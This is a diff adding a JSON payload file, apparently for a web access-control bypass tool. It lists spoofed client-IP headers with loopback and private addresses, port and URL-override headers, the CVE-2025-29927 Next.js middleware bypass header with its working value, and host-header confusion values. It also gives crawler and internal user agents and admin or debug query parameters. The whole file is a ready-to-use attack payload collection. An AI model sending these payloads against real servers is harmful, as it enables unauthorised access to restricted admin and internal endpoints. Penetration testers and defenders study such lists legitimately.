@@ -1,0 +1,55 @@
+{
+  "_comment": "Header-based bypass payloads. ip_headers x ip_values is a matrix (every header tried with every value). static_headers are single name/value pairs sent as-is.",
+
+  "ip_headers": [
+    "X-Forwarded-For", "X-Forward-For", "X-Forwarded-Host", "X-Forwarded-Proto",
+    "Forwarded", "Via", "X-Real-IP", "X-Remote-IP", "X-Remote-Addr",
+    "X-Trusted-IP", "X-Requested-By", "X-Requested-For", "X-Forwarded-Server",
+    "X-Originating-IP", "X-ProxyUser-Ip", "Client-IP", "True-Client-IP",
+    "Cluster-Client-IP", "X-Client-IP", "X-Host", "X-Forwarded"
+  ],
+  "ip_values": [
+    "127.0.0.1", "127.0.0.1:80", "127.0.0.1:443", "localhost",
+    "10.0.0.1", "10.0.0.0", "172.16.0.0", "192.168.1.1",
+    "0.0.0.0", "0", "[::1]", "127.1"
+  ],
+
+  "port_headers": [
+    "X-Forwarded-Port", "X-Forwarded-Ports", "X-Real-Port", "X-Port",
+    "Cdn-Src-Port", "Cdn-Server-Port", "X-Original-Port", "X-Remote-Port"
+  ],
+  "port_values": ["80", "443", "8080", "8443", "22", "3000"],
+
+  "override_headers": [
+    { "name": "X-Original-URL",  "value_is_path": true, "desc": "path override, sent with GET /" },
+    { "name": "X-Rewrite-URL",   "value_is_path": true, "desc": "path override, sent with GET /" },
+    { "name": "X-Override-URL",  "value_is_path": true, "desc": "path override, sent with GET /" },
+    { "name": "X-Original-URI",  "value_is_path": true, "desc": "nginx internal-redirect style override" },
+    { "name": "X-HTTP-Path-Override", "value_is_path": true, "desc": "path override, sent with GET /" },
+    { "name": "X-Custom-IP-Authorization", "value": "127.0.0.1", "desc": "static IP override header" }
+  ],
+
+  "static_headers": [
+    { "name": "x-middleware-subrequest", "value": "middleware:middleware:middleware:middleware:middleware", "desc": "CVE-2025-29927: Next.js middleware bypass", "source": "CVE-2025-29927" },
+    { "name": "Host", "value": "localhost", "desc": "host header confusion" },
+    { "name": "Host", "value": "", "desc": "blank host header, sometimes routes to default vhost" },
+    { "name": "Accept", "value": "application/json", "desc": "content-negotiation-aware ACLs" },
+    { "name": "Content-Type", "value": "application/json", "desc": "content-type-aware ACLs on GET" },
+    { "name": "Transfer-Encoding", "value": "chunked", "desc": "TE-aware ACL/proxy confusion on GET with empty body" },
+    { "name": "X-Forwarded-Scheme", "value": "internal", "desc": "internal-scheme spoofing" },
+    { "name": "X-ATT-DeviceId", "value": "internal", "desc": "misc internal marker header" },
+    { "name": "X-Wap-Profile", "value": "internal", "desc": "misc internal marker header" }
+  ],
+
+  "user_agents": [
+    "Googlebot/2.1 (+http://www.google.com/bot.html)",
+    "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
+    "curl/7.79.1",
+    "python-requests/2.28.0",
+    "Go-http-client/1.1",
+    "internal-tool/1.0",
+    "monitoring/1.0"
+  ],
+
+  "debug_params": ["debug=true", "test=1", "isAdmin=true", "admin=1", "internal=true", "bypass=1", "dev=true"]
+}
